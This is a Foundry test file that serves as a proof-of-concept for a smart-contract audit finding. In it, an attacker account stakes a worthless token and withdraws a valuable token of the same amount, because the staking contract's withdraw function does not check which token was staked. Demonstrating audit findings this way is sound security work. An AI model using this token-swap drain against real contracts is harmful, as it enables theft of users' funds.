// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/QuillTask.sol";

import "../src/POC/tokenType.sol";

/* Note: 

Disable the glitchy fee mechanism in withdraw as shown below using @note tag, to perform this POC. This glitch is covered in "Use of wrong variable" finding.

    function withdraw(IERC20 token, uint256 _amt) external {
        UserInfo storage user = userInfo[msg.sender];
        user.stakedAmount = user.stakedAmount - _amt;
        //@note calculateFee(msg.sender, _amt);
        uint256 rewards = user.pendingRewardAmount;
        user.rewardAmount = rewards;

        uint256 fee = _amt.mul(100).div(FEE_RATE);

        user.pendingRewardAmount = 0;
        user.stakedAt = 0;

        IERC20(rewardToken).transfer(msg.sender, rewards);
        IERC20(token).transfer(msg.sender, _amt //@note  - fee );
    }
  */

contract TokenType is Test {
    QuillTest public quillTest;
    CheapToken public cheapToken;
    ExpensiveToken public expensiveToken;

    uint256 mainnetFork;
    string MAINNET_RPC_URL = vm.envString("URL");
    address Hacker = vm.addr(0x2);

    function setUp() public {
        mainnetFork = vm.createSelectFork(MAINNET_RPC_URL);
        quillTest = new QuillTest();
        cheapToken = new CheapToken();
        expensiveToken = new ExpensiveToken();
        cheapToken.mint(Hacker, 1000);
        expensiveToken.mint(address(quillTest), 1000);
        // quillTest.transfer(Hacker, 1000);
    }

    function testTokenType() public {
        vm.startPrank(Hacker, Hacker);
        cheapToken.approve(address(quillTest), 1000);
        quillTest.stake(1000, cheapToken);
        quillTest.withdraw(expensiveToken, 1000);

        // Hacker staked cheapToken and withdrew expensive Token
        assertEq(expensiveToken.balanceOf(Hacker), 1000);

        vm.stopPrank();
    }
}
